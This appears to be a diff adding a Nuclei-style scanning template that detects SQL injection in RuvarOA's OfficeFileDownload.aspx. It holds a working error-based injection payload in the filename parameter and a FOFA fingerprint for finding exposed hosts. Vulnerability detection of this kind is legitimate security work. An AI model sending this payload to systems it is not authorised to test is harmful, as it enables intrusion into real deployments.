@@ -1,0 +1,35 @@
+id: ruvaroa-officefiledownload-sqli
+info:
+  name: RuvarOA OfficeFileDownload.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: ruvar-oa
+    fofa: body="txt_admin_key"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /WorkFlow/OfficeFileDownload.aspx?filename=1%27%20and%20%28sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))%29%3E0-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+      - type: word
+        words:
+          - "{{t2}}"
+        condition: and
+        part: body
